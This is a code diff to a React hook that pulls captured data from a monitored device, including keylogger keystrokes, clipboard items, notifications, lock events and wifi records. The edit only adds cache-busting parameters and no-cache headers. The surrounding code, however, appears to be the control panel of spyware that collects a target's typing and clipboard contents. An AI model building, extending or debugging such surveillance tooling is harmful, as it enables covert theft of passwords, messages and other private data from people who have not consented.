@@ -47,29 +47,31 @@ export function useDeviceTelemetry(deviceId: string) {
   const fetchTelemetryData = useCallback(async (module: string) => {
     if (!deviceId) return;
     setLoading(true);
+    const opts: RequestInit = { cache: "no-store", headers: { "Cache-Control": "no-cache" } };
+    const t = Date.now();
     try {
       if (module === "notifications") {
-        const res = await fetch(`/api/devices/${deviceId}/data/notifications`);
+        const res = await fetch(`/api/devices/${deviceId}/data/notifications?_t=${t}`, opts);
         if (res.ok) {
           const d = await res.json();
           setNotifications(d.notifications || []);
         }
       } else if (module === "keylogger") {
-        const res = await fetch(`/api/devices/${deviceId}/data/keystrokes`);
+        const res = await fetch(`/api/devices/${deviceId}/data/keystrokes?_t=${t}`, opts);
         if (res.ok) {
           const d = await res.json();
           setKeystrokes(d.keystrokes || []);
         }
       } else if (module === "clipboard") {
-        const res = await fetch(`/api/devices/${deviceId}/data/clipboard`);
+        const res = await fetch(`/api/devices/${deviceId}/data/clipboard?_t=${t}`, opts);
         if (res.ok) {
           const d = await res.json();
           setClipboardItems(d.clipboard || []);
         }
       } else if (module === "security") {
         const [lRes, wRes] = await Promise.all([
-          fetch(`/api/devices/${deviceId}/data/lock-events`),
-          fetch(`/api/devices/${deviceId}/data/wifi`),
+          fetch(`/api/devices/${deviceId}/data/lock-events?_t=${t}`, opts),
+          fetch(`/api/devices/${deviceId}/data/wifi?_t=${t}`, opts),
         ]);
         if (lRes.ok) {
           const ld = await lRes.json();
